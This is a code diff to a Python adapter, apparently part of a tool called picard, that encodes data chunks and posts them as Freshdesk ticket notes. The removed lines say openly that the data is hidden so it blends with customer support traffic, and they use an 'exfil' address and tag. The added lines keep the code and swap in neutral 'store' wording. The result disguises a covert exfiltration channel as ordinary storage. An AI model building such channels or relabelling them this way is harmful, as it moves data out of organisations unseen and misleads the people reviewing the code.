@@ -1,7 +1,6 @@
 """Freshdesk adapter -- stores chunks as ticket notes.
 
-Data is hidden inside Freshdesk ticket private notes,
-blending with customer support operations.
+Data is stored inside Freshdesk ticket private notes.
 
 Requires: pip install picard[freshdesk]  (uses aiohttp)
 """
@@ -57,10 +56,10 @@ class FreshdeskAdapter(Adapter):
         payload = {
             "subject": f"PICARD:{chunk_id}",
             "description": encoded_chunk,
-            "email": "picard@exfil.local",
+            "email": "picard@store.local",
             "priority": 1,
             "status": 2,
-            "tags": ["picard", "exfil"],
+            "tags": ["picard", "store"],
         }
         auth = aiohttp.BasicAuth(self._api_key, "X")
         headers = {"Content-Type": "application/json"}
